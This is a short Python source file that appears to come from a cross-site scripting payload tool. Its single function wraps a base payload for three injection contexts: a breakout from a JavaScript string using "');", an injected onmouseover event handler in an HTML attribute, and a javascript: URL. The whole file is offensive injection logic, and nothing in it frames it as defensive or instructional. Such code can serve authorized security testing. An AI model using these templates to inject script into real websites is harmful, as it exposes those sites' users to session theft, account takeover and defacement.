# payloads/context_aware.py

def generate_context_aware_payload(base_payload, context):
    """Generates a payload based on the context (e.g., script, attribute)."""
    if context == "script":
        return f"');{base_payload}//"
    elif context == "attribute":
        return f'" onmouseover="{base_payload}";"'
    elif context == "url":
        return f"javascript:{base_payload}"
    else:
        return base_payload

